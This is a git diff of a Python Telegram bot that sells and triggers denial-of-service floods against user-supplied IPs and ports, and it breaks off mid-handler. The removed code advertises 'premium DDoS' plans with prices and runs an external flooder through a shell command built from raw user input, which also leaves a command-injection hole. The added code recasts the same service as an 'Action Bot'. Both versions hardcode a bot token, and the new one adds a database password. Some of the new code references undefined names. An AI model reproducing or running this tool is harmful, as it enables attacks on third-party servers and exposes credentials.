@@ -1,900 +1,470 @@
-#script by @YOUR USERNAME
-
-
-import telebot
-
-import subprocess
-
-import datetime
-
 import os
+import re
+import subprocess
+import threading
+import telebot
+import logging
+import random
+import pytz
+import requests
+import ipaddress
+from datetime import datetime, timedelta
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from pymongo import MongoClient
 
+# Constants
+MONGO_URI = "mongodb+srv://lm6000k:IBRSupreme@ibrdata.uo83r.mongodb.net/"
+DB_NAME = "action"
+COLLECTION_NAME = "action"
+TOKEN = "7267969157:AAFBW9fqZYa1kMnAB9CerIxWQnJ0-6c7Wns"
+KOLKATA_TZ = pytz.timezone('Asia/Kolkata')
+AUTHORIZED_USERS = [6800732852]
+MAX_DURATION = 600  # Maximum duration in seconds
 
+# Initialize MongoDB
+client = MongoClient(MONGO_URI)
+db = client[DB_NAME]
+actions_collection = db[COLLECTION_NAME]
 
-from keep_alive import keep_alive
+# Initialize the bot
+bot = telebot.TeleBot(TOKEN)
 
-keep_alive()
+# Logging setup
+logging.basicConfig(filename='bot_actions.log', level=logging.INFO, 
+                    format='%(asctime)s - %(message)s')
 
-# insert your Telegram bot token here
+# Global variables
+authorized_users = {}
+processes = {}
+user_modes = {}
+supporter_users = {}
 
-bot = telebot.TeleBot('7267969157:AAFBW9fqZYa1kMnAB9CerIxWQnJ0-6c7Wns')
-
-
-
-# Admin user IDs
-
-admin_id = ["6800732852"]
-
-
-
-# File to store allowed user IDs
-
-USER_FILE = "users.txt"
-
-
-
-# File to store command logs
-
-LOG_FILE = "log.txt"
-
-
-
-# Function to read user IDs from the file
-
-def read_users():
-
+# Utility Functions
+def is_valid_ip(ip):
+    """Check if the provided IP address is valid."""
     try:
-
-        with open(USER_FILE, "r") as file:
-
-            return file.read().splitlines()
-
-    except FileNotFoundError:
-
-        return []
-
-
-
-# Function to read free user IDs and their credits from the file
-
-def read_free_users():
-
-    try:
-
-        with open(FREE_USER_FILE, "r") as file:
-
-            lines = file.read().splitlines()
-
-            for line in lines:
-
-                if line.strip():  # Check if line is not empty
-
-                    user_info = line.split()
-
-                    if len(user_info) == 2:
-
-                        user_id, credits = user_info
-
-                        free_user_credits[user_id] = int(credits)
-
-                    else:
-
-                        print(f"Ignoring invalid line in free user file: {line}")
-
-    except FileNotFoundError:
-
-        pass
-
-
-
-# List to store allowed user IDs
-
-allowed_user_ids = read_users()
-
-
-
-# Function to log command to the file
-
-def log_command(user_id, target, port, time):
-
-    admin_id = ["6758082727"]
-
-    user_info = bot.get_chat(user_id)
-
-    if user_info.username:
-
-        username = "@" + user_info.username
-
-    else:
-
-        username = f"UserID: {user_id}"
-
-    
-
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
-
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
-
-
-
-# Function to clear logs
-
-def clear_logs():
-
-    try:
-
-        with open(LOG_FILE, "r+") as file:
-
-            if file.read() == "":
-
-                response = "Logs are already cleared. No data found ❌."
-
-            else:
-
-                file.truncate(0)
-
-                response = "Logs cleared successfully ✅"
-
-    except FileNotFoundError:
-
-        response = "No logs found to clear."
-
-    return response
-
-
-
-# Function to record command logs
-
-def record_command_logs(user_id, command, target=None, port=None, time=None):
-
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-
-    if target:
-
-        log_entry += f" | Target: {target}"
-
-    if port:
-
-        log_entry += f" | Port: {port}"
-
-    if time:
-
-        log_entry += f" | Time: {time}"
-
-    
-
-    with open(LOG_FILE, "a") as file:
-
-        file.write(log_entry + "\n")
-
-
-
-import datetime
-
-
-
-# Dictionary to store the approval expiry date for each user
-
-user_approval_expiry = {}
-
-
-
-# Function to calculate remaining approval time
-
-def get_remaining_approval_time(user_id):
-
-    expiry_date = user_approval_expiry.get(user_id)
-
-    if expiry_date:
-
-        remaining_time = expiry_date - datetime.datetime.now()
-
-        if remaining_time.days < 0:
-
-            return "Expired"
-
-        else:
-
-            return str(remaining_time)
-
-    else:
-
-        return "N/A"
-
-
-
-# Function to add or update user approval expiry date
-
-def set_approval_expiry_date(user_id, duration, time_unit):
-
-    current_time = datetime.datetime.now()
-
-    if time_unit == "hour" or time_unit == "hours":
-
-        expiry_date = current_time + datetime.timedelta(hours=duration)
-
-    elif time_unit == "day" or time_unit == "days":
-
-        expiry_date = current_time + datetime.timedelta(days=duration)
-
-    elif time_unit == "week" or time_unit == "weeks":
-
-        expiry_date = current_time + datetime.timedelta(weeks=duration)
-
-    elif time_unit == "month" or time_unit == "months":
-
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
-
-    else:
-
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
         return False
 
+def is_valid_port(port):
+    """Check if the provided port is valid."""
+    return 1 <= int(port) <= 65535
+
+def is_valid_duration(duration):
+    """Check if the provided duration is valid."""
+    return 1 <= int(duration) <= MAX_DURATION
+
+def notify_admins(user_id, username):
+    """Notify admins about a new authorization request."""
+    message = (f"🔔 *New Authorization Request*\n\n"
+               f"👤 User: @{username} (ID: {user_id})\n"
+               f"⏳ Please approve or reject the request.")
+    for admin_id in AUTHORIZED_USERS:
+        bot.send_message(admin_id, message, parse_mode='Markdown')
+
+# Database Operations
+def authorize_user(user_id, expire_time):
+    """Authorize a user and set expiration time."""
+    expire_time_utc = expire_time.astimezone(pytz.utc)
+    actions_collection.update_one(
+        {'user_id': user_id},
+        {'$set': {'status': 'authorized', 'expire_time': expire_time_utc}},
+        upsert=True
+    )
+
+def load_authorizations():
+    """Load all authorized users from MongoDB."""
+    global authorized_users
+    authorized_users = {}
+    users = actions_collection.find({"status": "authorized"})
+    for user in users:
+        user_id = str(user['user_id'])
+        expire_time_utc = user.get('expire_time', datetime.utcnow())
+        expire_time_kolkata = expire_time_utc.astimezone(KOLKATA_TZ)
+        user['expire_time'] = expire_time_kolkata
+        authorized_users[user_id] = user
+
+def save_authorizations():
+    """Save all authorized users to MongoDB."""
+    for user_id, info in authorized_users.items():
+        expire_time_utc = info['expire_time'].astimezone(pytz.utc)
+        actions_collection.update_one(
+            {'user_id': user_id}, 
+            {'$set': {'status': info['status'], 'expire_time': expire_time_utc}},
+            upsert=True
+        )
+
+# Bot Handlers
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    """Send a welcome message with options for manual or auto mode."""
+    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    markup.add(KeyboardButton('Manual Mode'), KeyboardButton('Auto Mode'))
+    welcome_text = (
+        "👋 *Welcome to Action Bot!*\n\n"
+        "I help you manage actions efficiently. 🚀\n"
+        "🔹 Modes:\n"
+        "1. Manual: Enter IP, port, and duration.\n"
+        "2. Auto: Enter IP and port; duration is random.\n\n"
+        "🔹 Stop actions: Type `stop all`.\n"
+        "🔐 *Authorized users only.*"
+    )
+    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    """Handle general messages and process actions."""
+    user_id = message.from_user.id
+    if user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
+        bot.reply_to(message, '⛔ *Unauthorized.* Send /auth to request access.', parse_mode='Markdown')
+        return
+
+ # Mode selection handler
+@bot.message_handler(func=lambda message: message.text in ['Manual Mode', 'Auto Mode'])
+def set_mode(message):
+    user_id = message.from_user.id
+    selected_mode = message.text.lower().split()[0]  # 'manual' or 'auto'
     
+    # Update the user's mode
+    user_modes[user_id] = selected_mode
+    bot.reply_to(message, f"🔄 *Mode switched to {selected_mode.capitalize()} Mode!*")
+    
+# Command to show the list of active users and actions (admin only)
+@bot.message_handler(commands=['list_active'])
+def list_active_users(message):
+    user_id = message.from_user.id
+    if user_id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ You are not authorized to view the active users.", parse_mode='Markdown')
+        return
 
-    user_approval_expiry[user_id] = expiry_date
+    if not active_users:
+        bot.reply_to(message, "⚠️ No active users at the moment.", parse_mode='Markdown')
+        return
 
-    return True
+    active_list = "🟢 *Active Users and Actions:*\n"
+    for uid, info in active_users.items():
+        action = info.get("action", "Unknown action")
+        active_list += f"👤 User: {info['username']} (ID: {uid})\n🔹 Action: {action}\n\n"
 
+    bot.reply_to(message, active_list, parse_mode='Markdown')
 
+@bot.message_handler(commands=['approve'])
+def approve_user(message):
+    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ *You are not authorized to approve users.*", parse_mode='Markdown')
+        return
+    
+    try:
+        # Command format: /approve <user_id> <duration>
+        _, user_id, duration = message.text.split()
+        user_id = int(user_id)
 
-# Command handler for adding a user with approval time
+        now = datetime.now(kolkata_tz)
+        expire_time = None
+        
+        # Custom duration parsing
+        time_match = re.match(r"(\d+)([dhm])", duration)
+        if time_match:
+            value, unit = time_match.groups()
+            value = int(value)
+            if unit == 'h':
+                expire_time = now + timedelta(hours=value)
+            elif unit == 'd':
+                expire_time = now + timedelta(days=value)
+            elif unit == 'm':
+                expire_time = now + timedelta(days=30 * value)
+        elif duration == 'permanent':
+            expire_time = now + timedelta(days=365*100)  # 100 years for permanent
+        
+        if expire_time:
+            # Save to MongoDB using the authorize_user function
+            authorize_user(user_id, expire_time)
 
-@bot.message_handler(commands=['add'])
-
-def add_user(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        command = message.text.split()
-
-        if len(command) > 2:
-
-            user_to_add = command[1]
-
-            duration_str = command[2]
-
-
-
-            try:
-
-                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
-
-                if duration <= 0:
-
-                    raise ValueError
-
-                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
-
-                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
-
-                    raise ValueError
-
-            except ValueError:
-
-                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
-
-                bot.reply_to(message, response)
-
-                return
-
-
-
-            if user_to_add not in allowed_user_ids:
-
-                allowed_user_ids.append(user_to_add)
-
-                with open(USER_FILE, "a") as file:
-
-                    file.write(f"{user_to_add}\n")
-
-                if set_approval_expiry_date(user_to_add, duration, time_unit):
-
-                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
-
-                else:
-
-                    response = "Failed to set approval expiry date. Please try again later."
-
-            else:
-
-                response = "User already exists 🤦‍♂️."
-
+            bot.reply_to(message, f"✅ *User {user_id} has been authorized for {duration}!* 🎉", parse_mode='Markdown')
+            bot.send_message(user_id, "🎉 *You are now authorized to use the bot! Enjoy!* 🚀", parse_mode='Markdown')
+            logging.info(f"Admin {message.from_user.id} approved user {user_id} for {duration}")
         else:
+            bot.reply_to(message, "❌ *Invalid duration format!* Please use 'Xd', 'Xh', 'Xm', or 'permanent'.", parse_mode='Markdown')
 
-            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
+    except ValueError:
+        bot.reply_to(message, "❌ *Invalid command format!* Use `/approve <user_id> <duration>`.", parse_mode='Markdown')
 
-    else:
+@bot.message_handler(commands=['reject'])
+def reject_user(message):
+    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ *You are not authorized to reject users.*", parse_mode='Markdown')
+        return
 
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @NANDYADU1C"
+    try:
+        _, user_id = message.text.split()
+        user_id = int(user_id)
+        
+        if user_id in authorized_users and authorized_users[user_id]['status'] == 'pending':
+            authorized_users[user_id]['status'] = 'rejected'
+            save_authorizations()
+            bot.reply_to(message, f"🛑 *User {user_id}'s application has been rejected.*", parse_mode='Markdown')
+            logging.info(f"Admin {message.from_user.id} rejected user {user_id}'s application.")
 
+            # Notify the user that their application was rejected
+            bot.send_message(user_id, "❌ *Your authorization request has been declined by the admin.*", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, f"⚠️ *User {user_id} has no pending application.*", parse_mode='Markdown')
 
-
-    bot.reply_to(message, response)
-
-
-
-# Command handler for retrieving user info
-
-@bot.message_handler(commands=['info'])
-
-def get_user_info(message):
-
-    user_id = str(message.chat.id)
-
-    user_info = bot.get_chat(user_id)
-
-    username = user_info.username if user_info.username else "N/A"
-
-    user_role = "Admin" if user_id in admin_id else "User"
-
-    remaining_time = get_remaining_approval_time(user_id)
-
-    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}\n @NANDYADU1C"
-
-    bot.reply_to(message, response, parse_mode="HTML")
-
-
-
-
-
+    except ValueError:
+        bot.reply_to(message, "❌ *Invalid command format!* Use `/reject <user_id>`.", parse_mode='Markdown')
 
 
 @bot.message_handler(commands=['remove'])
-
 def remove_user(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        command = message.text.split()
-
-        if len(command) > 1:
-
-            user_to_remove = command[1]
-
-            if user_to_remove in allowed_user_ids:
-
-                allowed_user_ids.remove(user_to_remove)
-
-                with open(USER_FILE, "w") as file:
-
-                    for user_id in allowed_user_ids:
-
-                        file.write(f"{user_id}\n")
-
-                response = f"User {user_to_remove} removed successfully 👍."
-
-            else:
-
-                response = f"User {user_to_remove} not found in the list ❌."
-
-        else:
-
-            response = '''Please Specify A User ID to Remove. 
-
-✅ Usage: /remove <userid>'''
-
-    else:
-
-        response = "🔐 𝐤𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞:- @NANDYADU1C ❤️."
-
-
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['clearlogs'])
-
-def clear_logs_command(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        try:
-
-            with open(LOG_FILE, "r+") as file:
-
-                log_content = file.read()
-
-                if log_content.strip() == "":
-
-                    response = "Logs are already cleared. No data found ❌."
-
-                else:
-
-                    file.truncate(0)
-
-                    response = "Logs Cleared Successfully ✅"
-
-        except FileNotFoundError:
-
-            response = "Logs are already cleared ❌."
-
-    else:
-
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c❄."
-
-    bot.reply_to(message, response)
-
-
-
-
-
-@bot.message_handler(commands=['clearusers'])
-
-def clear_users_command(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        try:
-
-            with open(USER_FILE, "r+") as file:
-
-                log_content = file.read()
-
-                if log_content.strip() == "":
-
-                    response = "USERS are already cleared. No data found ❌."
-
-                else:
-
-                    file.truncate(0)
-
-                    response = "users Cleared Successfully ✅"
-
-        except FileNotFoundError:
-
-            response = "users are already cleared ❌."
-
-    else:
-
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c 🔐."
-
-    bot.reply_to(message, response)
-
- 
-
-
-
-@bot.message_handler(commands=['allusers'])
-
-def show_all_users(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        try:
-
-            with open(USER_FILE, "r") as file:
-
-                user_ids = file.read().splitlines()
-
-                if user_ids:
-
-                    response = "Authorized Users:\n"
-
-                    for user_id in user_ids:
-
-                        try:
-
-                            user_info = bot.get_chat(int(user_id))
-
-                            username = user_info.username
-
-                            response += f"- @{username} (ID: {user_id})\n"
-
-                        except Exception as e:
-
-                            response += f"- User ID: {user_id}\n"
-
-                else:
-
-                    response = "No data found ❌"
-
-        except FileNotFoundError:
-
-            response = "No data found ❌"
-
-    else:
-
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c❄."
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['logs'])
-
-def show_recent_logs(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-
-            try:
-
-                with open(LOG_FILE, "rb") as file:
-
-                    bot.send_document(message.chat.id, file)
-
-            except FileNotFoundError:
-
-                response = "No data found ❌."
-
-                bot.reply_to(message, response)
-
-        else:
-
-            response = "No data found ❌"
-
-            bot.reply_to(message, response)
-
-    else:
-
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c❄."
-
-        bot.reply_to(message, response)
-
-
-
-
-
-# Function to handle the reply when free users run the /bgmi command
-
-def start_attack_reply(message, target, port, time):
-
-    user_info = message.from_user
-
-    username = user_info.username if user_info.username else user_info.first_name
-
-    
-
-    response = f"{username}, 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐲 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 🤡🖕🏻\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of :- @NANDYADU1C"
-
-    bot.reply_to(message, response)
-
-
-
-# Dictionary to store the last time each user ran the /bgmi command
-
-bgmi_cooldown = {}
-
-
-
-COOLDOWN_TIME =0
-
-
-
-# Handler for /bgmi command
-
-@bot.message_handler(commands=['bgmi'])
-
-def handle_bgmi(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in allowed_user_ids:
-
-        # Check if the user is in admin_id (admins have no cooldown)
-
-        if user_id not in admin_id:
-
-            # Check if the user has run the command before and is still within the cooldown period
-
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-
-                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
-
-                bot.reply_to(message, response)
-
-                return
-
-            # Update the last time the user ran the command
-
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-
-        
-
-        command = message.text.split()
-
-        if len(command) == 4:  # Updated to accept target, time, and port
-
-            target = command[1]
-
-            port = int(command[2])  # Convert port to integer
-
-            time = int(command[3])  # Convert time to integer
-
-            if time > 600:
-
-                response = "Error: Time interval must be less than 600."
-
-            else:
-
-                record_command_logs(user_id, '/bgmi', target, port, time)
-
-                log_command(user_id, target, port, time)
-
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-
-                full_command = f"./nand {target} {port} {time} 200"
-
-                process = subprocess.run(full_command, shell=True)
-
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
-
-                bot.reply_to(message, response)  # Notify the user that the attack is finished
-
-        else:
-
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
-
-    else:
-
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. ᴅᴍ ᴛᴏ ʙᴜʏ ᴀᴄᴄᴇss ᴄʟɪᴄᴋ ʜᴇʀᴇ sᴇᴇ ᴅ-ᴅᴏs /plan 1⃣ ᴅᴀʏ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀʟᴏsᴏ ᴀᴠᴀɪʟᴀʙʟᴇ:- @nandyadu1c / @NANDYADU1C 🤡")
-
-
-
-    bot.reply_to(message, response)
-
-
-
-
-
-# Add /mylogs command to display logs recorded for bgmi and website commands
-
-@bot.message_handler(commands=['mylogs'])
-
-def show_command_logs(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in allowed_user_ids:
-
-        try:
-
-            with open(LOG_FILE, "r") as file:
-
-                command_logs = file.readlines()
-
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-
-                if user_logs:
-
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-
-                else:
-
-                    response = "❌ No Command Logs Found For You ❌."
-
-        except FileNotFoundError:
-
-            response = "No command logs found."
-
-    else:
-
-        response = "You Are Not Authorized To Use This Command 😡."
-
-
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['help'])
-
-def show_help(message):
-
-    help_text ='''🤖 Available commands:
-
-💥 /bgmi : Method For Bgmi Servers. 
-
-💥 /rules : Please Check Before Use !!.
-
-💥 /plan : Our rates are cheap, you can afford the plans Dm @nandyadu1c.
-
-
-
-
-Buy From :- @NANDYADU1C ✅
-
-Official Channel :- https://t.me/v2ddos
-'''
-
-    for handler in bot.message_handlers:
-
-        if hasattr(handler, 'commands'):
-
-            if message.text.startswith('/help'):
-
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-
-            elif handler.doc and 'admin' in handler.doc.lower():
-
-                continue
-
-            else:
-
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-
-    bot.reply_to(message, help_text)
-
-
-
-@bot.message_handler(commands=['start'])
-
-def welcome_start(message):
-
-    user_name = message.from_user.first_name
-
-    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
-
-
-🤖 𝙎𝙩𝙖𝙧𝙩 𝘿-𝘿𝙤𝙨 : /help 
-💥 /info : TO Check Your WHOLE INFO.
-✅ That Was Get Your Access From :- @NANDYADU1C☠️
-
-'''
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['rules'])
-
-def welcome_rules(message):
-
-    user_name = message.from_user.first_name
-
-    response = f'''{user_name} Please Follow These Rules ⚠️:
-
-
-
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-
-3. MAKE SURE YOU JOINED https://t.me/creativeydv OTHERWISE NOT WORK
-
-4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['plan'])
-
-def welcome_plan(message):
-
-    user_name = message.from_user.first_name
-
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
-
-
-
-Vip 🌟 :
-
--> Attack Time : 300 (S)
-
-> After Attack Limit : 10 sec
-
--> Concurrents Attack : 5
-
-
-
-Pr-ice List💸 :
-
-50 day
-
-250 week
-
-750 month
-
-'''
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['admincmd'])
-
-def welcome_plan(message):
-
-    user_name = message.from_user.first_name
-
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-
-
-💥 /add <userId> : Add a User.
-
-💥 /remove <userid> Remove a User.
-
-💥 /allusers : Authorised Users Lists.
-
-💥 /logs : All Users Logs.
-
-💥 /broadcast : Broadcast a Message.
-
-💥 /clearlogs : Clear The Logs File.
-
-💥 /clearusers : Clear The USERS File.
-
-'''
-
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['broadcast'])
-
-def broadcast_message(message):
-
-    user_id = str(message.chat.id)
-
-    if user_id in admin_id:
-
-        command = message.text.split(maxsplit=1)
-
-        if len(command) > 1:
-
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
-
-            with open(USER_FILE, "r") as file:
-
-                user_ids = file.read().splitlines()
-
-                for user_id in user_ids:
-
-                    try:
-
-                        bot.send_message(user_id, message_to_broadcast)
-
-                    except Exception as e:
-
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-
-            response = "Broadcast Message Sent Successfully To All Users 👍."
-
-        else:
-
-            response = "🤖 Please Provide A Message To Broadcast."
-
-    else:
-
-        response = "Only Admin Can Run This Command 😡."
-
-
-
-    bot.reply_to(message, response)
-
-
-
-
-
-
-
-#bot.polling()
-
-while True:
+    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
+        bot.reply_to(message, "⛔ *You are not authorized to remove users.*", parse_mode='Markdown')
+        return
 
     try:
+        _, user_id = message.text.split()
+        user_id = int(user_id)
+        
+        if user_id in authorized_users:
+            del authorized_users[user_id]
+            save_authorizations()
+            bot.reply_to(message, f"🚫 *User {user_id} has been removed from the authorization list.*", parse_mode='Markdown')
+            logging.info(f"Admin {message.from_user.id} removed user {user_id}.")
+            # Notify the user that their application was rejected
+            bot.send_message(user_id, "❌ *Your access has been removed by the admin.* Please contact to the provider for more information", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, f"⚠️ *User {user_id} is not in the authorization list.*", parse_mode='Markdown')
 
-        bot.polling(none_stop=True)
+    except ValueError:
+        bot.reply_to(message, "❌ *Invalid command format!* Use `/remove <user_id>`.", parse_mode='Markdown')
 
-    except Exception as e:
+@bot.message_handler(commands=['auth'])
+def request_authorization(message):
+    user_id = message.from_user.id
+    username = message.from_user.username if message.from_user.username else 'Unknown'
 
-        print(e)
+    # Check if the user is in the AUTHORIZED_USERS list (admins)
+    if user_id in AUTHORIZED_USERS:
+        bot.reply_to(message, "🎉 *You're already a trusted admin!* No need for authorization.", parse_mode='Markdown')
+        return
+
+    # Check if the user is already authorized and get their expiration time
+    user_info = actions_collection.find_one({'user_id': user_id})
+    
+    if user_info and user_info['status'] == 'authorized':
+        # Get and format expiration time in Kolkata timezone
+        expire_time_utc = user_info['expire_time']
+        expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
+        expire_time_str = expire_time_kolkata.strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Reply to the user with authorization status and expiration time
+        bot.reply_to(message, (
+            f"🎉 *You're already authorized to use the bot!*\n\n"
+            f"⏳ *Your authorization expires on:* {expire_time_str} (Asia/Kolkata time)"
+        ), parse_mode='Markdown')
+        return
+    
+    # If the user is not authorized, request authorization
+    bot.reply_to(message, (
+        f"🔒 *Authorization Requested!* Please wait for the admin to approve your request.\n\n"
+        f"👤 Your user ID: {user_id}\n"
+        f"👤 Username: @{username}\n\n"
+        "An admin will review your request soon. 🙌"
+    ), parse_mode='Markdown')
+
+    # Notify all admins of the authorization request
+    notify_admins(user_id, username)
+
+    # Log the authorization request
+    logging.info(f"User {user_id} ({username}) requested authorization")
+def is_authorized(user_id):
+    """Check if a user is authorized."""
+    user = actions_collection.find_one({'user_id': user_id})
+    if user and user['status'] == 'authorized':
+        now = datetime.now(KOLKATA_TZ)
+        expire_time = user['expire_time'].astimezone(KOLKATA_TZ)
+        if now < expire_time:
+            return True
+        actions_collection.update_one({'user_id': user_id}, {'$set': {'status': 'expired'}})
+    return False
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    user_id = message.from_user.id
+    chat_type = message.chat.type
+
+    # Skip authorization check if the user is in the AUTHORIZED_USERS list
+    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
+        bot.reply_to(message, '⛔ *You are not authorized to use this bot.* Please send /auth to request access. 🤔\n\n_This bot was made by Ibr._', parse_mode='Markdown')
+        return
+
+    text = message.text.strip().lower()
+
+    # Skip if the user is selecting mode
+    if text in ['manual mode', 'auto mode']:
+        return
+
+    user_mode = user_modes.get(user_id, 'manual')  # Default to 'manual' if mode not set
+
+    if text == 'stop all':
+        stop_all_actions(message)
+        return
+
+    # Regex to match "<ip> <port> <duration>" for manual mode or "<ip> <port>" for auto mode
+    auto_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})")
+    manual_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d{1,4})")
+
+    if user_mode == 'auto':
+        # Auto mode logic
+        match = auto_mode_pattern.match(text)
+        if match:
+            ip, port = match.groups()
+            duration = random.randint(80, 120)  # Random duration for auto mode
+
+            # Validate IP and Port
+            if not is_valid_ip(ip):
+                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
+            if not is_valid_port(port):
+                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
+
+            # Show the stop action button
+            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+            stop_button = KeyboardButton('Stop Action')
+            markup.add(stop_button)
+
+            # Respond to the user that the action is starting
